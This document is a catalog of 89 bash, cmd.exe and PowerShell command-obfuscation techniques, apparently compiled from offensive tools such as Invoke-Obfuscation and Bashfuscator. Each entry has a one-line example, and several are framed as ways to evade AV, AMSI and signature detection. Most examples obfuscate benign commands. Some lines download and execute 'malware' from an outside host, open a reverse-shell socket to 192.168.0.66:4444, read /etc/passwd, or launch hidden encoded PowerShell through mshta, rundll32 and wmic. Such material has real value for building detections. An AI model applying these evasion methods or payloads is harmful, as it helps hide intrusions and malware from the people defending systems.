# Obfuscation Techniques
> Source: Invoke-Obfuscation, Invoke-DOSfuscation, Bashfuscator, PowerShell-Obfuscation-Bible | Entries: 89 | Platform: linux, windows


## Index

- [obfuscation](#obfuscation)


### obfuscation

#### bash_ansi_c_quoting
Uses the ANSI-C quoting mechanism ($'...') to embed escape sequences in command strings.  This is the general form th...
**Categories:** obfuscation, bash_obfuscation, command_obfuscation, ANSICQuoting
```
$'\x77\x68\x6f\x61\x6d\x69'
```

#### bash_backslash_insertion
Inserts backslash characters between letters in command names.  Bash treats a backslash followed by a non-special cha...
**Categories:** obfuscation, bash_obfuscation, command_obfuscation, BackslashInsertion
```
w\h\o\a\m\i
```

#### bash_base64_wrapping
Encodes the entire command as a base64 string, then decodes and executes it at runtime using a pipeline like 'echo <b...
**Categories:** obfuscation, bash_obfuscation, string_obfuscation, Base64Wrapping
```
echo 'd2hvYW1p' | base64 -d | bash
```

#### bash_brace_expansion
Abuses bash brace expansion to construct command strings.  While brace expansion normally generates multiple words, c...
**Categories:** obfuscation, bash_obfuscation, token_obfuscation, BraceExpansion
```
eval "$(printf %s {w,h,o,a,m,i})"
```

#### bash_bzip2_compressor
Compresses the command using bzip2, then base64-encodes the result.  At runtime, the base64 payload is decoded, decom...
**Categories:** obfuscation, bash_obfuscation, compressor_obfuscation, Bzip2Compressor
```
echo 'QlpoOTFBWSZTWQ==' | base64 -d | bunzip2 | bash
```

#### bash_case_swapping
Uses bash variable case manipulation operators (${var^^} for uppercase, ${var,,} for lowercase) to transform strings...
**Categories:** obfuscation, bash_obfuscation, command_obfuscation, CaseSwapping
```
v='WHOAMI'; ${v,,}
```

#### bash_command_substitution_nesting
Nests commands within $(...) or backtick substitutions to add layers of indirection.  The outer shell evaluates the i...
**Categories:** obfuscation, bash_obfuscation, command_obfuscation, CommandSubstitutionNesting
```
$(echo whoami)
```

#### bash_double_quote_concatenation
Splits commands using adjacent double-quoted fragments.  Similar to single-quote concatenation but uses double quotes...
**Categories:** obfuscation, bash_obfuscation, command_obfuscation, DoubleQuoteConcatenation
```
"wh""oam""i"
```

#### bash_eval_exec_wrapping
Wraps obfuscated commands inside eval or exec calls.  eval parses and executes its arguments as a bash command, allow...
**Categories:** obfuscation, bash_obfuscation, encoder_obfuscation, EvalExecWrapping
```
eval 'whoami'
```

#### bash_glob_pattern_construction
Abuses filesystem glob patterns to construct command paths without spelling them out.  For example, /???/??n/w?o?m? e...
**Categories:** obfuscation, bash_obfuscation, string_obfuscation, GlobConstruction
```
/???/??n/w?o?m?
```

#### bash_gzip_compressor
Compresses the command using gzip, then base64-encodes the compressed data for safe embedding.  At runtime, the paylo...
**Categories:** obfuscation, bash_obfuscation, compressor_obfuscation, GzipCompressor
```
echo 'H4sIAAAAAAAAA0tMTgYAeL3S3gMAAAA=' | base64 -d | gunzip | bash
```

#### bash_heredoc_herestring_abuse
Uses bash here-strings (<<<) or here-documents (<<EOF) to feed commands to bash/sh/eval instead of using echo or prin...
**Categories:** obfuscation, bash_obfuscation, command_obfuscation, HereDocHereString
```
bash <<< 'whoami'
```

#### bash_hex_encoder
Encodes the command as a hex string and decodes at runtime using printf with \xNN format specifiers or xxd -r -p.  Un...
**Categories:** obfuscation, bash_obfuscation, encoder_obfuscation, HexEncoder
```
printf '\x77\x68\x6f\x61\x6d\x69' | bash
```

#### bash_hex_encoding
Encodes each character of a command as a hex escape sequence using bash ANSI-C quoting ($'\xNN').  Bash interprets th...
**Categories:** obfuscation, bash_obfuscation, string_obfuscation, HexEncoding
```
$'\x77\x68\x6f\x61\x6d\x69'
```

#### bash_history_expansion
Abuses bash history expansion (!, !!, !-N, !string) to reference and re-execute previous commands.  In interactive sh...
**Categories:** obfuscation, bash_obfuscation, command_obfuscation, HistoryExpansion
```
whoami; !!
```

#### bash_ifs_manipulation
Overrides the Internal Field Separator (IFS) variable to change how bash splits words.  By setting IFS to a custom ch...
**Categories:** obfuscation, bash_obfuscation, token_obfuscation, IFSManipulation
```
IFS=,;x='cat,/etc/passwd';$x
```

#### bash_octal_encoding
Encodes command characters as octal escape sequences within ANSI-C quoting ($'\NNN').  Functionally identical to hex...
**Categories:** obfuscation, bash_obfuscation, string_obfuscation, OctalEncoding
```
$'\167\150\157\141\155\151'
```

#### bash_process_substitution
Uses bash process substitution <(command) or >(command) to execute code through a virtual file descriptor.  The comma...
**Categories:** obfuscation, bash_obfuscation, token_obfuscation, ProcessSubstitution
```
bash <(echo whoami)
```

#### bash_reverse_command
Reverses the command string and uses the rev utility (or tac for line-level reversal) to reconstruct it at runtime....
**Categories:** obfuscation, bash_obfuscation, command_obfuscation, ReverseCommand
```
echo 'imaohw' | rev | bash
```

#### bash_single_quote_concatenation
Splits command names using adjacent single-quoted string fragments.  In bash, adjacent quoted strings are automatical...
**Categories:** obfuscation, bash_obfuscation, command_obfuscation, SingleQuoteConcatenation
```
'wh''oam''i'
```

#### bash_unicode_encoding
Encodes characters using unicode escape sequences in ANSI-C quoting ($'\uNNNN' or $'\UNNNNNNNN').  Bash 4.2+ supports...
**Categories:** obfuscation, bash_obfuscation, string_obfuscation, UnicodeEncoding
```
$'\u0077\u0068\u006f\u0061\u006d\u0069'
```

#### bash_variable_indirection
Uses bash indirect variable expansion (${!var}) to resolve command names through multiple levels of variable referenc...
**Categories:** obfuscation, bash_obfuscation, token_obfuscation, VariableIndirection
```
a=cmd; cmd=whoami; ${!a}
```

#### bash_variable_substring
Extracts individual characters or substrings from existing shell variables (like $PATH, $HOME, $SHELL) using the ${va...
**Categories:** obfuscation, bash_obfuscation, token_obfuscation, VariableSubstring
```
${PATH:0:1}${PATH:4:1}${HOME:0:1}  # extracts characters to form commands
```

#### bash_xor_encoder
XOR-encodes the command bytes with a key, then decodes at runtime using a bash loop or python/perl one-liner.  XOR en...
**Categories:** obfuscation, bash_obfuscation, encoder_obfuscation, XOREncoder
```
key=42; for b in 93 90 85 75 91 93; do printf "\\x$(printf '%02x' $((b^key)))"; done | bash
```

#### cmd_caret_insertion_basic
Inserts caret (^) characters throughout command tokens.  In cmd.exe, the caret is the escape character and is strippe...
**Categories:** obfuscation, cmd_obfuscation, caret, BasicCaret
```
w^h^o^a^m^i
```

#### cmd_caret_insertion_heavy
Maximally inserts carets by placing one between every single character in the command.  This creates an extreme visua...
**Categories:** obfuscation, cmd_obfuscation, caret, HeavyCaret
```
w^h^o^a^m^i^ ^/^a^l^l
```

#### cmd_comma_semicolon_substitution
Replaces spaces between command arguments with commas (,) or semicolons (;).  In cmd.exe, commas and semicolons are t...
**Categories:** obfuscation, cmd_obfuscation, delimiter_substitution, CommaSemicolon
```
cmd,/c,whoami
```

#### cmd_compound_all_layers
Applies multiple DOSfuscation techniques simultaneously: caret insertion, variable concatenation, substring extractio...
**Categories:** obfuscation, cmd_obfuscation, compound, AllLayers
```
(((s^e^t,a=!comspec:~14,1!)&(s^e^t,b=!comspec:~4,1!)&(c^a^l^l,%a%%b%)))
```

#### cmd_compound_caret_concatenation
Combines caret insertion with environment variable concatenation for multi-layer obfuscation.  Each SET command has c...
**Categories:** obfuscation, cmd_obfuscation, compound, CaretConcatenation
```
s^e^t a=who&s^e^t b=ami&c^a^l^l %a%%b%
```

#### cmd_compound_concat_variable_expansion
Combines SET-based concatenation with %VAR:~N,L% substring extraction for multi-layer obfuscation.  First, environmen...
**Categories:** obfuscation, cmd_obfuscation, compound, ConcatVariableExpansion
```
set a=%comspec:~14,1%&set b=%comspec:~4,1%&set c=%comspec:~25,1%&set d=%comspec:~0,1%&set e=%comspec:~23,1%&set f=%comspec:~7,1%&call %a%%b%%c%%d%%e%%f%
```

#### cmd_concatenation_basic
Breaks a command into multiple fragments stored in separate environment variables using SET, then concatenates the va...
**Categories:** obfuscation, cmd_obfuscation, concatenation, BasicConcatenation
```
set a=who&set b=ami&call %a%%b%
```

#### cmd_concatenation_delayed
Uses cmd.exe delayed expansion (enabled with /V:ON or /V flag) to concatenate variable fragments using !VAR! syntax i...
**Categories:** obfuscation, cmd_obfuscation, concatenation, DelayedConcatenation
```
cmd /V:ON /C "set a=who&set b=ami&echo !a!!b!"
```

#### cmd_concatenation_set_chaining
Assigns command fragments to variables in a deliberately jumbled order, then concatenates them in the correct sequenc...
**Categories:** obfuscation, cmd_obfuscation, concatenation, SetChaining
```
set c=mi&set a=who&set b=a&call %a%%b%%c%
```

#### cmd_double_percent_encoding
Uses %% (double percent) for variable references in batch file (.bat/.cmd) context instead of single % used in intera...
**Categories:** obfuscation, cmd_obfuscation, double_percent, BatchPercent
```
for /f %%a in ('whoami') do @echo %%a
```

#### cmd_fincoding_basic
Uses the FINDSTR command to search for specific character patterns in strings, files, or command output, extracting m...
**Categories:** obfuscation, cmd_obfuscation, fincoding, BasicFINcoding
```
cmd /V /C "echo whoami|findstr /i "whoami"&&whoami"
```

#### cmd_fincoding_file_based
Uses FINDSTR to search through files on the system (such as system DLLs, text files in Windows directories, or even t...
**Categories:** obfuscation, cmd_obfuscation, fincoding, FileBased
```
for /f "tokens=1" %a in ('findstr /c:"localhost" C:\Windows\System32\drivers\etc\hosts') do @set x=%a:~0,1%
```

#### cmd_forcoding_assoc_ftype
Uses the ASSOC or FTYPE commands to enumerate file type associations, then extracts specific characters from their ou...
**Categories:** obfuscation, cmd_obfuscation, forcoding, AssocFtype
```
for /f "tokens=2 delims==" %a in ('assoc .cmd') do @echo %a
```

#### cmd_forcoding_basic
Uses cmd.exe FOR /F loops to extract specific characters from command output or strings by token position and then co...
**Categories:** obfuscation, cmd_obfuscation, forcoding, BasicFORcoding
```
cmd /V /C "set command=whoami&for /L %i in (1,1,6) do @set /a char=!command:~%i,1!>nul"
```

#### cmd_forcoding_variable_extraction
Extracts characters from existing environment variables using FOR loops combined with variable substring syntax (%VAR...
**Categories:** obfuscation, cmd_obfuscation, forcoding, VariableExtraction
```
cmd /V /C "set w=!comspec:~14,1!!comspec:~4,1!!comspec:~25,1!!comspec:~0,1!!comspec:~23,1!!comspec:~7,1!&call !w!"
```

#### cmd_parentheses_grouping
Wraps commands or command components in unnecessary parentheses () to alter the visual structure and break pattern-ma...
**Categories:** obfuscation, cmd_obfuscation, parentheses, GroupingAbuse
```
((((whoami))))
```

#### cmd_reversal_basic
Stores the command as a reversed string, then uses a FOR /L loop to iterate through the characters in reverse order,...
**Categories:** obfuscation, cmd_obfuscation, reversal, BasicReversal
```
cmd /V /C "set r=imaohw&set o=&for /L %i in (5,-1,0) do @set o=!o!!r:~%i,1!&if %i==0 call !o!"
```

#### cmd_reversal_nested
Combines command reversal with environment variable extraction to create multi-layer obfuscation.  The reversed comma...
**Categories:** obfuscation, cmd_obfuscation, reversal, NestedReversal
```
cmd /V /C "set r=!comspec:~7,1!!comspec:~0,1!!comspec:~23,1!!comspec:~25,1!!comspec:~4,1!!comspec:~14,1!&set o=&for /L %i in (5,-1,0) do @set o=!o!!r:~%i,1!&if %i==0 call !o!"
```

#### cmd_variable_expansion_substitution
Uses the %VAR:old=new% substitution syntax to transform environment variable content.  This syntax replaces all occur...
**Categories:** obfuscation, cmd_obfuscation, variable_expansion, Substitution
```
set a=xhxoxaxmxi&cmd /C "%a:x=%"
```

#### cmd_variable_expansion_substring
Uses the %VAR:~start,length% substring syntax to extract characters from environment variables.  Every environment va...
**Categories:** obfuscation, cmd_obfuscation, variable_expansion, Substring
```
%comspec:~14,1%%comspec:~4,1%%comspec:~25,1%%comspec:~0,1%%comspec:~23,1%%comspec:~7,1%
```

#### powershell_compress_deflate
Compresses the command using the Deflate algorithm, then wraps it in a PowerShell decompression cradle that inflates...
**Categories:** obfuscation, powershell_obfuscation, compress_obfuscation, Deflate
```
IEX(New-Object IO.StreamReader(New-Object IO.Compression.DeflateStream([IO.MemoryStream][Convert]::FromBase64String('7b0HYBxJliUmL23Ke39K9UrX4HShCIBgEyTYkEAQ7MGIzeaS7B1pRyMpqyqBymVWZV1mFkDM7Z28995777333nvvvfe6O51OJ/ff/z9cZmQBbPbOStrJniGAqsgfP358Hz8i+r5ctvPyNz8BAA=='),[IO.Compression.CompressionMode]::Decompress)),[Text.Encoding]::ASCII).ReadToEnd())
```

#### powershell_compress_gzip
Compresses the command using Gzip algorithm and wraps it in a decompression cradle.  Similar to Deflate but uses Gzip...
**Categories:** obfuscation, powershell_obfuscation, compress_obfuscation, Gzip
```
IEX(New-Object IO.StreamReader(New-Object IO.Compression.GzipStream([IO.MemoryStream][Convert]::FromBase64String('H4sIAAAAAAAEAMtIzcnJVyjPL8pJUQQAlRumDwwAAAA='),[IO.Compression.CompressionMode]::Decompress)),[Text.Encoding]::ASCII).ReadToEnd())
```

#### powershell_encoding_ascii
Converts each character to its decimal ASCII code and reconstructs at runtime.  Similar to hex encoding but uses deci...
**Categories:** obfuscation, powershell_obfuscation, encoding_obfuscation, ASCII
```
IEX ([char[]](87,114,105,116,101,45,72,111,115,116,32,104,101,108,108,111) -join '')
```

#### powershell_encoding_base64
Encodes the entire command as a Base64 string and decodes it at runtime using [Convert]::FromBase64String or PowerShe...
**Categories:** obfuscation, powershell_obfuscation, encoding_obfuscation, Base64
```
powershell -enc VwByAGkAdABlAC0ASABvAHMAdAAgAGgAZQBsAGwAbwA=
```

#### powershell_encoding_binary
Converts each character to its binary (base-2) representation and reconstructs at runtime.  Binary encoding produces...
**Categories:** obfuscation, powershell_obfuscation, encoding_obfuscation, Binary
```
IEX(('01010111','01110010','01101001','01110100','01100101','00101101','01001000','01101111','01110011','01110100','00100000','01101000','01100101','01101100','01101100','01101111'|%{[char][convert]::ToInt32($_,2)}) -join '')
```

#### powershell_encoding_bxor
XOR-encodes each byte of the command with a key value, then decodes at runtime by XORing again with the same key.  XO...
**Categories:** obfuscation, powershell_obfuscation, encoding_obfuscation, BXOR
```
$key = 0x42; IEX (([byte[]]@(0x15,0x30,0x2B,0x36,0x27,0x6F,0x0A,0x2D,0x31,0x36,0x62,0x2A,0x27,0x2E,0x2E,0x2D) | %{[char]($_ -bxor $key)}) -join '')
```

#### powershell_encoding_hex
Converts each character of the command to its hexadecimal representation (0x##) and reconstructs the string at runtim...
**Categories:** obfuscation, powershell_obfuscation, encoding_obfuscation, Hex
```
IEX ([char[]](0x57,0x72,0x69,0x74,0x65,0x2D,0x48,0x6F,0x73,0x74,0x20,0x68,0x65,0x6C,0x6C,0x6F) -join '')
```

#### powershell_encoding_octal
Encodes each character as its octal representation and reconstructs the command at runtime.  Less common than hex enc...
**Categories:** obfuscation, powershell_obfuscation, encoding_obfuscation, Octal
```
IEX(('127','162','151','164','145','55','110','157','163','164','40','150','145','154','154','157'|%{[char][convert]::ToInt32($_,8)}) -join '')
```

#### powershell_encoding_securestring
Abuses PowerShell's SecureString infrastructure to encode commands.  ConvertTo-SecureString and ConvertFrom-SecureStr...
**Categories:** obfuscation, powershell_obfuscation, encoding_obfuscation, SecureString
```
$s = 'Write-Host hello' | ConvertTo-SecureString -AsPlainText -Force | ConvertFrom-SecureString; IEX ([Runtime.InteropServices.Marshal]::PtrToStringAuto([Runtime.InteropServices.Marshal]::SecureStringToBSTR(($s | ConvertTo-SecureString))))
```

#### powershell_launcher_cmd
Wraps the PowerShell execution inside cmd.exe using /c or /k flags.  This adds an extra process layer between the ini...
**Categories:** obfuscation, powershell_obfuscation, launcher_obfuscation, Cmd
```
cmd /c powershell -nop -w h -enc VwByAGkAdABlAA==
```

#### powershell_launcher_cscript_wscript
Uses cscript.exe or wscript.exe to execute a VBScript or JScript file (or inline script) that launches PowerShell.  T...
**Categories:** obfuscation, powershell_obfuscation, launcher_obfuscation, CscriptWscript
```
echo CreateObject("WScript.Shell").Run "powershell -nop -w h -enc VwByAGkAdABlAA==" > %TEMP%\a.vbs && cscript //nologo %TEMP%\a.vbs
```

#### powershell_launcher_mshta
Uses mshta.exe with inline VBScript to launch PowerShell.  Mshta is the Microsoft HTML Application Host, and it can e...
**Categories:** obfuscation, powershell_obfuscation, launcher_obfuscation, Mshta
```
mshta vbscript:Execute("CreateObject(""WScript.Shell"").Run ""powershell -nop -w h -enc VwByAGkAdABlAA=="", 0:close")
```

#### powershell_launcher_powershell
Obfuscates the PowerShell.exe launcher itself using path variations, abbreviated parameter names, environment variabl...
**Categories:** obfuscation, powershell_obfuscation, launcher_obfuscation, PowerShell
```
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -nop -w h -enc VwByAGkAdABlAA==
```

#### powershell_launcher_rundll32
Uses rundll32.exe with the mshtml RunHTMLApplication entry point to execute JavaScript that launches PowerShell.  Run...
**Categories:** obfuscation, powershell_obfuscation, launcher_obfuscation, Rundll32
```
rundll32 javascript:"\..\mshtml,RunHTMLApplication";document.write();h=new%20ActiveXObject("WScript.Shell").Run("powershell -nop -w h -enc VwByAGkAdABlAA==")
```

#### powershell_launcher_wmic
Uses wmic.exe process call create to spawn PowerShell.  WMIC is a legitimate system management tool, so its execution...
**Categories:** obfuscation, powershell_obfuscation, launcher_obfuscation, Wmic
```
wmic process call create "powershell -nop -w h -enc VwByAGkAdABlAA=="
```

#### powershell_string_concatenation
Applies string concatenation at the entire-command level, breaking the full script/command into multiple concatenated...
**Categories:** obfuscation, powershell_obfuscation, string_obfuscation, Concatenation
```
IEX ('Write-H'+'ost'+' '+'hel'+'lo')
```

#### powershell_string_reorder_format_operator
Uses PowerShell's -f (format) operator to reorder string fragments.  The command is split into pieces placed out of o...
**Categories:** obfuscation, powershell_obfuscation, string_obfuscation, Reorder
```
IEX ('{2}{0}{1}' -f 'oke-','Expression','Inv')
```

#### powershell_string_reverse
Reverses the entire command string, then uses array reversal and -join to reconstruct the original command at runtime...
**Categories:** obfuscation, powershell_obfuscation, string_obfuscation, Reverse
```
$r = 'olleh tsoH-etirW'; IEX (-join $r[-1..-($r.Length)])
```

#### powershell_token_random_case
Randomizes the casing of command names, parameter names, and other tokens.  PowerShell is case-insensitive, so 'InVoK...
**Categories:** obfuscation, powershell_obfuscation, token_obfuscation, RandomCase
```
inVOkE-ExPReSSioN 'Write-Host hello'
```

#### powershell_token_string_concatenation
Breaks command/function names into concatenated string fragments using the + operator.  The PowerShell runtime reasse...
**Categories:** obfuscation, powershell_obfuscation, token_obfuscation, StringConcatenation
```
& ('Inv'+'oke'+'-Exp'+'ression') 'Write-Host hello'
```

#### powershell_token_tick_insertion
Inserts PowerShell escape characters (backticks `) into command and parameter names at positions where the tick is a...
**Categories:** obfuscation, powershell_obfuscation, token_obfuscation, TickInsertion
```
I`nv`oke-`Exp`ress`ion 'Write-Host hello'
```

#### powershell_token_type_cast_obfuscation
Constructs command names by casting integers to [char] type and concatenating the results.  Each character of the com...
**Categories:** obfuscation, powershell_obfuscation, token_obfuscation, TypeCast
```
& ([char]73+[char]69+[char]88 -join '') 'Write-Host hello'
```

#### powershell_token_variable_replacement
Stores command names or code fragments in variables, then invokes them via the call operator (& or .).  This indirect...
**Categories:** obfuscation, powershell_obfuscation, token_obfuscation, VariableReplacement
```
$v = 'IEX'; & $v 'Write-Host hello'
```

#### powershell_token_wildcard_member_access
Uses .NET string join, array indexing, or wildcard-based member access to construct command names dynamically.  Lever...
**Categories:** obfuscation, powershell_obfuscation, token_obfuscation, WildcardMemberAccess
```
& ([string]::join('',('I','E','X'))) 'Write-Host hello'
```

#### ps_obfuscation_add_or_remove_comments_appending_comments
Obfuscating a script by appending comments here and there might actually do the trick on its own. for example, a reve...
**Categories:** obfuscation, powershell_obfuscation, manual_obfuscation, appending_comments
```
<# Suspendisse imperdiet lacus eu tellus pellentesque suscipit #> $client = New-Object System.Net.Sockets.TCPClient("192.168.0.66", 4444) <# Lorem ipsum dolor sit amet #>
```

#### ps_obfuscation_add_or_remove_comments_removing_comments
There are malware-ish strings that will trigger AMSI immediately and it should be a priority to replace them, when ob...
**Categories:** obfuscation, powershell_obfuscation, manual_obfuscation, removing_comments
```
# Remove comments containing tool names: 'Invoke-Mimikatz' triggers AMSI
```

#### ps_obfuscation_append_junk_add_remove_parameters
You can try adding parameters to a cmdlet. For example, the following line: Could be expanded to: You may of course t...
**Categories:** obfuscation, powershell_obfuscation, manual_obfuscation, add_remove_parameters
```
iex "whoami"
```

#### ps_obfuscation_append_junk_append_random_objects
You can "pollute" a script with random variables and functions. Assume the following script as malicious: You might b...
**Categories:** obfuscation, powershell_obfuscation, manual_obfuscation, append_random_objects
```
$b64 = $(irm -uri http://192.168.0.66/malware);
```

#### ps_obfuscation_cmdlet_caret_interruption
This is a bit dirty but might come in handy. In a Windows CMD terminal, it is possible to append the caret (^) symbol...
**Categories:** obfuscation, powershell_obfuscation, manual_obfuscation, cmdlet_caret_interruption
```
cmd /c "who^am^i"
```

#### ps_obfuscation_cmdlet_quote_interruption
You can obfuscate cmdlets by adding single and/or double quotes in between their characters, as long as it's not at t...
**Categories:** obfuscation, powershell_obfuscation, manual_obfuscation, cmdlet_quote_interruption
```
i''ex "pwd"
```

#### ps_obfuscation_execute_script_line_by_line
Sometimes, it is possible to achieve AV evasion by simply executing a malicious script line by line. This can of cour...
**Categories:** obfuscation, powershell_obfuscation, manual_obfuscation, execute_script_line_by_line
```
$client = New-Object System.Net.Sockets.TCPClient('192.168.0.66', 4444)
```

#### ps_obfuscation_get_command_technique
A really cool trick my friend and mighty haxor Karol Musolff (@kmusolff) showed me. You can use `Get-Command` (or `gc...
**Categories:** obfuscation, powershell_obfuscation, manual_obfuscation, get_command_technique
```
Invoke-RestMethod -uri https://192.168.0.66/malware | iex
```

#### ps_obfuscation_mess_with_strings_base64_decode_the_desired_string
PowerShell obfuscation technique: Base64 decode the desired string:. Manual obfuscation method for evading signature-...
**Categories:** obfuscation, powershell_obfuscation, manual_obfuscation, base64_decode_the_desired_string
```
[System.Text.Encoding]::Default.GetString([System.Convert]::FromBase64String("bWFsd2FyZQ=="))
```

#### ps_obfuscation_mess_with_strings_concatenation
PowerShell obfuscation technique: Concatenation. Manual obfuscation method for evading signature-based detection in P...
**Categories:** obfuscation, powershell_obfuscation, manual_obfuscation, concatenation
```
'mal' + 'w' + 'ar' + 'e'
```

#### ps_obfuscation_mess_with_strings_convert_string_to_here_string
At the expense of adding a few new lines, you can turn a string into a here-string. This: Is the same as:
**Categories:** obfuscation, powershell_obfuscation, manual_obfuscation, convert_string_to_here_string
```
$x = 'echo malware';
```

#### ps_obfuscation_mess_with_strings_get_string_from_substring
Add the desired value between an irrelevant string and use `substring()` to extract it based on start - end indexes:
**Categories:** obfuscation, powershell_obfuscation, manual_obfuscation, get_string_from_substring
```
'xxxmalwarexxx'.Substring(3,7)
```

#### ps_obfuscation_mess_with_strings_get_the_desired_strings_chars_from_bytes
PowerShell obfuscation technique: Get the desired string's chars from bytes:. Manual obfuscation method for evading s...
**Categories:** obfuscation, powershell_obfuscation, manual_obfuscation, get_the_desired_strings_chars_from_bytes
```
"$([char]([byte]0x6d)+[char]([byte]0x61)+[char]([byte]0x6c)+[char]([byte]0x77)+[char]([byte]0x61)+[char]([byte]0x72)+[char]([byte]0x65))"
```

#### ps_obfuscation_mess_with_strings_replace_string_by_regex_match
PowerShell obfuscation technique: Replace string by regex match:. Manual obfuscation method for evading signature-bas...
**Categories:** obfuscation, powershell_obfuscation, manual_obfuscation, replace_string_by_regex_match
```
'a123' -replace '[a-zA-Z]{1}[\d]{1,3}','malware'
```

#### ps_obfuscation_mess_with_strings_reverse_strings
PowerShell obfuscation technique: Reverse Strings. Manual obfuscation method for evading signature-based detection in...
**Categories:** obfuscation, powershell_obfuscation, manual_obfuscation, reverse_strings
```
$x="Your string reversed".ToCharArray(); [array]::reverse($x); $x -join ""
```

#### ps_obfuscation_obfuscate_boolean_values
It's super fun and easy to replace `$True` and `$False` values with other boolean equivalents, which are literaly unl...
**Categories:** obfuscation, powershell_obfuscation, manual_obfuscation, obfuscate_boolean_values
```
[bool]1254
```

#### ps_obfuscation_randomize_char_cases
Probably the oldest trick in the book. Randomazing the character case of cmdlets and parameters might help:
**Categories:** obfuscation, powershell_obfuscation, manual_obfuscation, randomize_char_cases
```
inVOkE-eXpReSSioN -vErbOse "WHoAmI /aLL" -dEBug
```

#### ps_obfuscation_rearrange_script_components
Sometimes simply moving variables and classes to different locations might work, especially if you have found the det...
**Categories:** obfuscation, powershell_obfuscation, manual_obfuscation, rearrange_script_components
```
# Move variable definitions to the top of the script to break detection signatures
```

#### ps_obfuscation_rename_objects
When obfuscating scripts, it should be a priority to replace variable/class/function names with random ones. That way...
**Categories:** obfuscation, powershell_obfuscation, manual_obfuscation, rename_objects
```
$a4b3c2d1e5f6a7b8 = New-Object System.Net.Sockets.TCPClient('192.168.0.66', 4444)
```

#### ps_obfuscation_substitute_commands
You can always look for commands or even whole code blocks in a script that you can substitute with components that h...
**Categories:** obfuscation, powershell_obfuscation, manual_obfuscation, substitute_commands
```
"$($p = (Split-Path `"$(pwd)\\0x00\`");if ($p.trim() -eq ''){echo 'C:\'}else{echo $p})"
```

#### ps_obfuscation_substitute_loops
There are certain loops that can be substituted with other loop types or functions. For example, a `While ($True){ #...
**Categories:** obfuscation, powershell_obfuscation, manual_obfuscation, substitute_loops
```
For (;;) { # some code }
```
